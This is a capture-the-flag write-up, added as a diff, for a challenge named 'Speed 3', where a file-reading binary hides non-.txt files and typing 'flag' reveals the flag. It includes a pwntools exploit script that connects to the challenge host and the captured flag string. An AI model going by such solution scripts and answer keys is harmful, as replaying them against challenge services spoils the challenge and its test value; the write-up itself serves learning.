@@ -1,0 +1,85 @@
+# Speed 3
+
+## Challenge
+
+We're given a binary that prints a list of `*.txt` files and allows us to read from a file of our choice.
+
+## Solution
+
+We can see by disassembling the binary that only `*.txt` files are listed.
+This means that there may be other files present which do not have this file extension.
+
+Considering the challenges prior use the filename `flag` for the flag file, we can try reading from that.
+
+By typing `flag` into the prompt, the program will print the flag.
+
+## Exploit
+
+```py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host speed-03.hfsc.tf --port 45000 speed3
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('speed3')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'speed-03.hfsc.tf'
+port = int(args.PORT or 45000)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak *0x{exe.entry:x}
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x8048000)
+
+io = start()
+
+io.sendlineafter(b"\x1b[1mc4t:\x1b[0m ", b"flag")
+
+io.interactive()
+```
+
+## Flag
+
+```
+midnight{6394f7b33c3d4e9b50dbe8c18e6d2f43}
+```
